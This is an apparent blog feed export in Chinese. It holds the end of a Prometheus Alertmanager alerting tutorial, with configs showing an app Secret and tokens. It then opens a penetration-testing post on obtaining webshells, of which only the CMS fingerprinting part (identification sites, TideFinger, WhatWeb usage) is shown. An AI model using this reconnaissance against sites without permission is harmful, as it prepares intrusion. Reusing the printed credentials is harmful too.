class="string">&#x27;alertname&#x27;</span>,<span class="string">&#x27;operations&#x27;</span>, <span class="string">&#x27;instance&#x27;</span>] <span class="comment"># 确保这个配置下的标签内容相同才会抑制，也就是说警报中必须有这三个标签值才会被抑制。</span></span><br></pre></td></tr></table></figure>

<h3 id="route路由匹配规则"><a href="#route路由匹配规则" class="headerlink" title="route路由匹配规则"></a>route路由匹配规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route:</span><br><span class="line">  receiver: admin # 默认的接收器名称</span><br><span class="line">  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。</span><br><span class="line">  group_interval: 5m # 如果组内内容不变化，5m后发送。</span><br><span class="line">  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警</span><br><span class="line">  group_by: [alertname,cluster]  # 报警分组，根据 prometheus 的 lables 进行报警分组，这些警报会合并为一个通知发送给接收器，也就是警报分组。</span><br><span class="line">  routes:</span><br><span class="line">      - match:</span><br><span class="line">          team: ops</span><br><span class="line">        group_by: [env,dc]</span><br><span class="line">        receiver: &#x27;ops&#x27;</span><br><span class="line">      - match_re:</span><br><span class="line">          service: nginx|apache</span><br><span class="line">        receiver: &#x27;web&#x27;</span><br><span class="line">      - match_re:</span><br><span class="line">          service: mysql|mongodb</span><br><span class="line">        receiver: &#x27;db&#x27;</span><br><span class="line">      - match_re:</span><br><span class="line">          service: hbase|spark</span><br><span class="line">        receiver: &#x27;hadoop&#x27;</span><br></pre></td></tr></table></figure>

<p>在以上的例子中，默认的警报组全部发送给 <code>admin</code> ，且根据路由按照 <code>alertname</code> <code>cluster</code> 进行警报分组。在子路由中的若匹配警报中的标签 <code>team</code> 的值为 <code>ops</code>，Alertmanager 会按照标签 <code>env</code> <code>dc</code> 进行警报分组然后发送给接收器 <code>receiver</code> ops配置的警报通知源。<br>继续匹配的操作是对 <code>service</code> 标签进行匹配，并且配到了 <code>nginx</code> <code>redis</code> <code>mongodb</code> 的值，就会向接收器 <code>receiver</code> web配置的警报通知源发送警报信息。</p>
<h3 id="receiver接收器"><a href="#receiver接收器" class="headerlink" title="receiver接收器"></a>receiver接收器</h3><p>接受器是一个统称，每个 <code>receiver</code> 都有需要设置一个全局唯一的名称，并且对应一个或者多个通知方式，包括email、微信、Slack、钉钉等。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">&lt;string&gt;</span></span><br><span class="line"><span class="attr">email_config:</span></span><br><span class="line">    [ <span class="bullet">-</span> <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">hipchat_configs:</span> <span class="comment">#此模块配置已经被移除了</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">pagerduty_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">pushover_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">slack_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">opsgenie_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">webhook_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">victorops_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br><span class="line"><span class="attr">webchat_configs:</span></span><br><span class="line">    [ <span class="string">&lt;config&gt;</span> ]</span><br></pre></td></tr></table></figure>

<p>可以看到Alertmanager提供了很多种接收器的通知配置，我们可以使用webhook接收器来定义通知集成，支持用户自己定义编写。</p>
<p><strong>官方配置<a href="https://prometheus.io/docs/alerting/latest/configuration/#receiver">Configuration | Prometheus</a></strong></p>
<h3 id="inhibit-rules抑制器"><a href="#inhibit-rules抑制器" class="headerlink" title="inhibit_rules抑制器"></a>inhibit_rules抑制器</h3><p><code>inhibit_rules</code> 模块中设置警报抑制功能，可以指定在特定条件下需要忽略的警报条件。可以使用此选项设置首选，比如优先处理某些警报，如果同一组中的警报同时发生，则忽略其他警报。<br>合理使用 <code>inhibit_rules</code> ，可以减少频发发送没有意义的警报的产生。</p>
<p><code>inhibit_rules</code> 配置信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trget_match:</span><br><span class="line">     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]</span><br><span class="line">trget_match_re:</span><br><span class="line">     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]</span><br><span class="line">source_match:</span><br><span class="line">     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]</span><br><span class="line">source_match_re:</span><br><span class="line">     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]</span><br><span class="line">[ equal: &#x27;[&#x27; &lt;lable_name&gt;, ...]&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>范例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inhibit_rules: # 抑制规则</span><br><span class="line">  - source_match: # 源标签警报触发时抑制含有目标标签的警报，在当前警报匹配 status: &#x27;High&#x27;</span><br><span class="line">      status: &#x27;High&#x27;  # 此处的抑制匹配一定在最上面的route中配置不然，会提示找不key。</span><br><span class="line">    target_match:</span><br><span class="line">      status: &#x27;Warning&#x27; # 目标标签值正则匹配，可以是正则表达式如: &quot;.*MySQL.*&quot;</span><br><span class="line">    equal: [&#x27;alertname&#x27;,&#x27;operations&#x27;, &#x27;instance&#x27;] # 确保这个配置下的标签内容相同才会抑制，也就是说警报中必须有这三个标签值才会被抑制。</span><br></pre></td></tr></table></figure>

<h2 id="四-警报通知接收器"><a href="#四-警报通知接收器" class="headerlink" title="四.警报通知接收器"></a>四.警报通知接收器</h2><h3 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h3><p>前面已经讲过，Alertmanager默认支持配置Email，也是最普通的方式，在Alertmanager组件中内置了SMTP协议。直接可以把前面的Alertmanager.yml中的SMTP部分截取出来，然后进行调整与配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global:</span><br><span class="line">  resolve_timeout: 5m</span><br><span class="line">  # smtp配置</span><br><span class="line">  smtp_from: &quot;1234567890@qq.com&quot; # 发送邮件主题</span><br><span class="line">  smtp_smarthost: &#x27;smtp.qq.com:465&#x27; # 邮箱服务器的SMTP主机配置</span><br><span class="line">  smtp_auth_username: &quot;1234567890@qq.com&quot; # 登录用户名</span><br><span class="line">  smtp_auth_password: &quot;auth_pass&quot; # 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。</span><br><span class="line">  smtp_require_tls: false # 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。</span><br><span class="line">route:</span><br><span class="line">  receiver: ops</span><br><span class="line">  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。</span><br><span class="line">  group_interval: 5m # 如果组内内容不变化，合并为一条警报信息，5m后发送。</span><br><span class="line">  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警。</span><br><span class="line">  group_by: [alertname]  # 报警分组</span><br><span class="line">  routes:</span><br><span class="line">      - match:</span><br><span class="line">          team: operations</span><br><span class="line">        group_by: [env,dc]</span><br><span class="line">        receiver: &#x27;ops&#x27;</span><br><span class="line">      - receiver: ops # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送</span><br><span class="line">        group_wait: 10s</span><br><span class="line">        match:</span><br><span class="line">          team: operations</span><br><span class="line"># 接收器指定发送人以及发送渠道</span><br><span class="line">receivers:</span><br><span class="line"># ops分组的定义</span><br><span class="line">- name: ops</span><br><span class="line">  email_configs:</span><br><span class="line">  - to: &#x27;9935226@qq.com,xxxxx@qq.com&#x27; # 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。</span><br><span class="line">    send_resolved: true</span><br><span class="line">    headers:</span><br><span class="line">      from: &quot;警报中心&quot;</span><br><span class="line">      subject: &quot;[operations] 报警邮件&quot;</span><br><span class="line">      to: &quot;小煜狼皇&quot;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220912093336699.png" alt="image-20220912093336699"></p>
<h3 id="企业微信"><a href="#企业微信" class="headerlink" title="企业微信"></a>企业微信</h3><p>第一步登录进入以后，在应用管理中新建应用。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2426480-bd781128e7d77348.png" alt="img"></p>
<p>第二步，创建应用，信息填写如下，上传应用logo随意。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2426480-1f4548ed507ed417.png" alt="img"></p>
<p>创建成功以后如下图。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2426480-b7806b8e478d5b0f.png" alt="img"></p>
<p>微信应用信息</p>
<p>这时候需要把 <code>AgentId</code> 和 <code>Secret</code> 记录下来，对于你的这种Secret信息，最好管理好，我的用过就会删除，所以不用担心安全隐患。</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>key</th>
</tr>
</thead>
<tbody><tr>
<td><code>AgentId</code></td>
<td><code>1000004</code></td>
</tr>
<tr>
<td><code>Secret</code></td>
<td><code>F-fzpgsabmfiFt7_4QRQwWEl8eyx7evO12sRYe_Q5vA</code></td>
</tr>
</tbody></table>
<p>第三步，现在我们来用新建的企业微信应用在Alertmanager配置，可以配置全局，也可以对单独需要发送的接收器，因为警报需要分级，所以需要单独处理，在这里使用的的单独的配置，需要知道 <strong>企业ID</strong> ，以及 <strong>部门ID</strong> 。</p>
<p><strong>企业ID</strong> 通过</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2426480-e8f2bef97f1af99c.png" alt="img"></p>
<p><strong>部门ID</strong> 通过通讯录获取</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2426480-4b3e83e5da4d51f7.png" alt="img"></p>
<p>这时候我们重启Alertmanager，然后使用之前的方式来触发模拟警报，看看发送是不是已经没有问题了，这时我们的企业微信中、Email都可以收到警报了，这里的警报已经被我用模块处理过了。可读性会更高。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat wechat.tmpl</span><br><span class="line">## wechat模板</span><br><span class="line">&#123;&#123; define &quot;wechat.default.message&quot; &#125;&#125;</span><br><span class="line">&#123;&#123; if gt (len .Alerts.Firing) 0 -&#125;&#125;</span><br><span class="line">Alerts Firing:</span><br><span class="line">&#123;&#123; range .Alerts &#125;&#125;</span><br><span class="line">警报级别：&#123;&#123; .Labels.status &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报类型：&#123;&#123; .Labels.alertname &#125;&#125;</span><br><span class="line"></span><br><span class="line">故障主机: &#123;&#123; .Labels.instance &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报主题: &#123;&#123; .Annotations.summary &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报详情: &#123;&#123; .Annotations.description &#125;&#125;</span><br><span class="line"></span><br><span class="line">⏱ : &#123;&#123; (.StartsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; if gt (len .Alerts.Resolved) 0 -&#125;&#125;</span><br><span class="line">Alerts Resolved:</span><br><span class="line">&#123;&#123; range .Alerts &#125;&#125;</span><br><span class="line">警报级别：&#123;&#123; .Labels.status &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报类型：&#123;&#123; .Labels.alertname &#125;&#125;</span><br><span class="line"></span><br><span class="line">故障主机: &#123;&#123; .Labels.instance &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报主题: &#123;&#123; .Annotations.summary &#125;&#125;</span><br><span class="line"></span><br><span class="line">警报详情: &#123;&#123; .Annotations.description &#125;&#125;</span><br><span class="line"></span><br><span class="line">⏱ : &#123;&#123; (.StartsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;</span><br><span class="line">⏲ : &#123;&#123; (.EndsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="钉钉机器人"><a href="#钉钉机器人" class="headerlink" title="钉钉机器人"></a>钉钉机器人</h3><p>Prometheus-webhook-Dingtalk组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/prometheus-webhook-dingtalk/template/</span><br><span class="line">cd /etc/prometheus-webhook-dingtalk/</span><br><span class="line">wget https://github.com/timonwong/prometheus-webhook-dingtalk/releases/download/v1.4.0/prometheus-webhook-dingtalk-1.4.0.linux-amd64.tar.gz</span><br><span class="line">tar xf prometheus-webhook-dingtalk-1.4.0.linux-amd64.tar.gz</span><br><span class="line">mv prometheus-webhook-dingtalk-1.4.0.linux-amd64/* /etc/prometheus-webhook-dingtalk/</span><br><span class="line">mv prometheus-webhook-dingtalk /bin/</span><br><span class="line">cat &lt;&lt;EOF&gt; /lib/systemd/system/prometheus-webhook-dingtalk.service </span><br><span class="line">[Unit]</span><br><span class="line">Description=prometheus-webhook-dingding</span><br><span class="line">Documentation=https://prometheus.io/</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=prometheus</span><br><span class="line">ExecStart=/bin/prometheus-webhook-dingtalk --web.listen-address=&quot;:8070&quot; --web.enable-ui --config.file=&quot;/etc/prometheus-webhook-dingtalk/config.yml&quot;</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br><span class="line">## 启动服务</span><br><span class="line">systemctl enable prometheus-webhook-dingtalk.service</span><br><span class="line">systemctl start prometheus-webhook-dingtalk.service</span><br></pre></td></tr></table></figure>

<p>配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Request timeout</span><br><span class="line"># timeout: 5s</span><br><span class="line"></span><br><span class="line">## Customizable templates path</span><br><span class="line">## Customizable templates path</span><br><span class="line">templates:</span><br><span class="line">        # - contrib/templates/legacy/template.tmpl</span><br><span class="line">  # 自定义模板路径</span><br><span class="line">  - /etc/prometheus-webhook-dingtalk/template/default.tmpl</span><br><span class="line"></span><br><span class="line">## 你还可以使用&#x27; default_message &#x27;覆盖默认模板</span><br><span class="line">## 下面的示例使用v0.3.0中的“legacy”模板</span><br><span class="line"># default_message:</span><br><span class="line">#   title: &#x27;&#123;&#123; template &quot;legacy.title&quot; . &#125;&#125;&#x27;</span><br><span class="line">#   text: &#x27;&#123;&#123; template &quot;legacy.content&quot; . &#125;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">## Targets, previously was known as &quot;profiles&quot;</span><br><span class="line"># 定义的webhook，钉钉创建的webhook token</span><br><span class="line">targets:</span><br><span class="line"># 如果有多个分组就可以在这里定义多个接口</span><br><span class="line">  ops:</span><br><span class="line">    url: https://oapi.dingtalk.com/robot/send?access_token=a4feed2322222222222222222222222</span><br><span class="line">  web:</span><br><span class="line">    url: https://oapi.dingtalk.com/robot/send?access_token=a4feed2325c1333333333333333333333</span><br></pre></td></tr></table></figure>

<p>定义模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/prometheus-webhook-dingtalk/template</span><br><span class="line">cat default.tmpl</span><br><span class="line">&#123;&#123; define &quot;__subject&quot; &#125;&#125;[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;] &#123;&#123; .GroupLabels.SortedPairs.Values | join &quot; &quot; &#125;&#125; &#123;&#123; if gt (len .CommonLabels) (len .GroupLabels) &#125;&#125;(&#123;&#123; with .CommonLabels.Remove .GroupLabels.Names &#125;&#125;&#123;&#123; .Values | join &quot; &quot; &#125;&#125;&#123;&#123; end &#125;&#125;)&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;__alertmanagerURL&quot; &#125;&#125;&#123;&#123; .ExternalURL &#125;&#125;/#/alerts?receiver=&#123;&#123; .Receiver &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; define &quot;__text_alert_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;</span><br><span class="line">**Labels**</span><br><span class="line">&#123;&#123; range .Labels.SortedPairs &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br><span class="line">**Annotations**</span><br><span class="line">&#123;&#123; range .Annotations.SortedPairs &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br><span class="line">**Source:** [&#123;&#123; .GeneratorURL &#125;&#125;](&#123;&#123; .GeneratorURL &#125;&#125;)</span><br><span class="line">&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/* Firing */&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; define &quot;default.__text_alert_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Trigger Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.StartsAt) &quot;Asia/Shanghai&quot; &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Summary:** &#123;&#123; .Annotations.summary &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Description:** &#123;&#123; .Annotations.description &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Graph:** [📈 ](&#123;&#123; .GeneratorURL &#125;&#125;)</span><br><span class="line"></span><br><span class="line">**Details:**</span><br><span class="line">&#123;&#123; range .Labels.SortedPairs &#125;&#125;&#123;&#123; if and (ne (.Name) &quot;severity&quot;) (ne (.Name) &quot;summary&quot;) &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/* Resolved */&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; define &quot;default.__text_resolved_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Trigger Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.StartsAt) &quot;Asia/Shanghai&quot; &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Resolved Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.EndsAt) &quot;Asia/Shanghai&quot; &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Summary:** &#123;&#123; .Annotations.summary &#125;&#125;</span><br><span class="line"></span><br><span class="line">**Graph:** [📈 ](&#123;&#123; .GeneratorURL &#125;&#125;)</span><br><span class="line"></span><br><span class="line">**Details:**</span><br><span class="line">&#123;&#123; range .Labels.SortedPairs &#125;&#125;&#123;&#123; if and (ne (.Name) &quot;severity&quot;) (ne (.Name) &quot;summary&quot;) &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/* Default */&#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;default.title&quot; &#125;&#125;&#123;&#123; template &quot;__subject&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;default.content&quot; &#125;&#125;#### \[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;\] **[&#123;&#123; index .GroupLabels &quot;alertname&quot; &#125;&#125;](&#123;&#123; template &quot;__alertmanagerURL&quot; . &#125;&#125;)**</span><br><span class="line">&#123;&#123; if gt (len .Alerts.Firing) 0 -&#125;&#125;</span><br><span class="line"></span><br><span class="line">![Firing-img](https://is3-ssl.mzstatic.com/image/thumb/Purple20/v4/e0/23/cf/e023cf56-0623-0cdf-afce-97ae90eabfda/mzl.uplmrpgi.png/320x0w.jpg)</span><br><span class="line"></span><br><span class="line">**Alerts Firing**</span><br><span class="line">&#123;&#123; template &quot;default.__text_alert_list&quot; .Alerts.Firing &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line">&#123;&#123; if gt (len .Alerts.Resolved) 0 -&#125;&#125;</span><br><span class="line"></span><br><span class="line">![Resolved-img](https://is3-ssl.mzstatic.com/image/thumb/Purple18/v4/41/72/99/4172990a-f666-badf-9726-6204a320c16e/mzl.dypdixoy.png/320x0w.png)</span><br><span class="line"></span><br><span class="line">**Alerts Resolved**</span><br><span class="line">&#123;&#123; template &quot;default.__text_resolved_list&quot; .Alerts.Resolved &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/* Legacy */&#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;legacy.title&quot; &#125;&#125;&#123;&#123; template &quot;__subject&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;legacy.content&quot; &#125;&#125;#### \[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;\] **[&#123;&#123; index .GroupLabels &quot;alertname&quot; &#125;&#125;](&#123;&#123; template &quot;__alertmanagerURL&quot; . &#125;&#125;)**</span><br><span class="line">&#123;&#123; template &quot;__text_alert_list&quot; .Alerts.Firing &#125;&#125;</span><br><span class="line">&#123;&#123;- end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/* Following names for compatibility */&#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;ding.link.title&quot; &#125;&#125;&#123;&#123; template &quot;default.title&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;</span><br><span class="line">&#123;&#123; define &quot;ding.link.content&quot; &#125;&#125;&#123;&#123; template &quot;default.content&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="在alertmanager中配置警报"><a href="#在alertmanager中配置警报" class="headerlink" title="在alertmanager中配置警报"></a>在alertmanager中配置警报</h3><p>让三个报警报警</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 接收器指定发送人以及发送渠道</span><br><span class="line">receivers:</span><br><span class="line"># ops分组的定义</span><br><span class="line">- name: ops</span><br><span class="line">  email_configs:</span><br><span class="line">  - to: &#x27;9935226@qq.com,10000@qq.com&#x27;</span><br><span class="line">    send_resolved: true</span><br><span class="line">    headers: &#123; Subject: &quot;[operations] 报警邮件&quot;&#125; # 接收邮件的标题</span><br><span class="line">  # 钉钉配置</span><br><span class="line">  webhook_configs:</span><br><span class="line">  - url: http://localhost:8070/dingtalk/ops/send # 这里是在钉钉开源组件中的接口，如果单独定义的receiver需要对应你的分组与钉钉机器人的webhook token</span><br><span class="line">    # 企业微信配置</span><br><span class="line">  wechat_configs:</span><br><span class="line">  - corp_id: &#x27;ww5421dksajhdasjkhj&#x27;</span><br><span class="line">    api_url: &#x27;https://qyapi.weixin.qq.com/cgi-bin/&#x27;</span><br><span class="line">    send_resolved: true</span><br><span class="line">    to_party: &#x27;2&#x27;</span><br><span class="line">    agent_id: &#x27;1000002&#x27;</span><br><span class="line">    api_secret: &#x27;Tm1kkEE3RGqVhv5hO-khdakjsdkjsahjkdksahjkdsahkj&#x27;</span><br><span class="line"># web</span><br><span class="line">- name: web</span><br><span class="line">  email_configs:</span><br><span class="line">  - to: &#x27;9935226@qq.com&#x27;</span><br><span class="line">    send_resolved: true</span><br><span class="line">    headers: &#123; Subject: &quot;[web] 报警邮件&quot;&#125; # 接收邮件的标题</span><br><span class="line">  webhook_configs:</span><br><span class="line">  - url: http://localhost:8070/dingtalk/web/send</span><br></pre></td></tr></table></figure>

<h2 id="报警规则"><a href="#报警规则" class="headerlink" title="报警规则"></a>报警规则</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi prometheus-rules.yaml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--内网渗透(5)</title>
    <url>/posts/f254f946.html</url>
    <content><![CDATA[<h1 id="获取webshell方法总结"><a href="#获取webshell方法总结" class="headerlink" title="获取webshell方法总结"></a>获取webshell方法总结</h1><h2 id="CMS获取webshell"><a href="#CMS获取webshell" class="headerlink" title="CMS获取webshell"></a>CMS获取webshell</h2><p>什么是CMS</p>
<p>​	CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。</p>
<p>如何搜寻CMS信息</p>
<p>​	常见方法：[信息收集-CMS识别-CSDN博客](<a href="https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=%E5%88%B0%E6%82%A8%E8%A6%81%E6%A3%80%E6%9F%A5%E7%9A%84%E7%BD%91%E7%AB%99--%3E%E6%8C%89">https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=到您要检查的网站--&gt;按</a> Ctrl %2B U 显示页面代码—&gt;在 html 页面上找到前缀为meta name%3D”generator”content%3D的标签—&gt;引擎名称将在“内容”一词后用引号表示,js 文件路径的行中。 例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持)</p>
<h3 id="在线信息收集网站"><a href="#在线信息收集网站" class="headerlink" title="在线信息收集网站"></a>在线信息收集网站</h3><p>国内<br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a>        #识别CMS插件</p>
<p><a href="https://www.yunsee.cn/">https://www.yunsee.cn</a>                    #云悉CMS识别</p>
<p><a href="http://finger.tidesec.net/">http://finger.tidesec.net</a>                   #潮汐指纹识别</p>
<p><a href="https://www.godeye.vip/">https://www.godeye.vip</a>                  #WEB指纹识别</p>
<p>1.2：国外<br><a href="http://itrack.ru/whatcms">http://itrack.ru/whatcms</a>                 #CMS识别国外 （俄罗斯）</p>
<p><a href="https://builtwith.com/">https://builtwith.com</a>                      #全面的 CMS 检测</p>
<p><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com</a>      #网站CMS识别</p>
<p><a href="https://cmsdetect.com/">https://cmsdetect.com</a>                  #CMS识别</p>
<p><a href="https://rescan.io/">https://rescan.io</a>                            #CMS列表识别</p>
<p><a href="https://scanwp.net/">https://scanwp.net</a>                        #包括插件也监测</p>
<p><a href="https://www.isitwp.com/">https://www.isitwp.com</a>                #专注WordPress识别</p>
<p><a href="https://www.codeinwp.com/find-out-what-wordpress-theme-is-that">https://www.codeinwp.com/find-out-what-wordpress-theme-is-that</a></p>
<h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p>御剑WEB指纹识别</p>
<p>相关链接：<a href="http://www.xitongzhijia.net/soft/171203.html">http://www.xitongzhijia.net/soft/171203.html</a>  （文件自测）</p>
<p>TideFinger（潮汐）</p>
<p>项目地址：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p>
<p>安装教程：<br>git clone <a href="https://github.com/TideSec/TideFinger.git">https://github.com/TideSec/TideFinger.git</a><br>cd TideFinger&#x2F;cd python3&#x2F; &amp;&amp; pip3 install -r requirements.txt  -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p>
<p>使用说明：<br>python3 TideFinger.py -u <a href="http://www.123.com/">http://www.123.com</a> [-p 1] [-m 50] [-t 5] [-d 0]<br>   -u: 待检测目标URL地址<br>   -p:指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80<br>   -m: 指纹匹配的线程数，不指定时默认为50<br>   -t: 网站响应超时时间，默认为5秒<br>   -d: 是否启用目录匹配式指纹探测（会对目标站点发起大量请求），0为不启用，1为启用，默认为不启用</p>
<p>WhatWeb（kali自带）</p>
<p>项目地址：<a href="https://github.com/urbanadventurer/WhatWeb.git">https://github.com/urbanadventurer/WhatWeb.git</a></p>
<p>安装教程：<br>cd WhatWeb &amp;&amp; apt install ruby-bundler &amp;&amp;  bundle install &amp;&amp;</p>
<p>使用说明：<br>whatweb <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>大宝剑</p>
<p>项目地址：<a href="https://github.com/wgpsec/DBJ">https://github.com/wgpsec/DBJ</a></p>
